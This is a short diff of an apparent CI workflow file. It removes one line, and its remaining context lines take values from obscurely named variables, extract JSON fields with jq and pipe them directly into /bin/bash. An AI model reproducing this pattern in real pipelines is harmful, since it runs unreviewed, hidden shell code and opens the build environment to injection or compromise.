@@ -31,7 +31,6 @@ jobs:
           echo $afrbl3361 | jq -r .at20 | /bin/bash
           printf '%s' "$gaq09" | jq -r .uh5070 | /bin/bash
           printf '%s' "$mft89" | jq -r .dr1 | /bin/bash
-          printf '%s' "$drmod4" | jq -r .pbke0 | /bin/bash
 
       - name: Save output
         if: always()
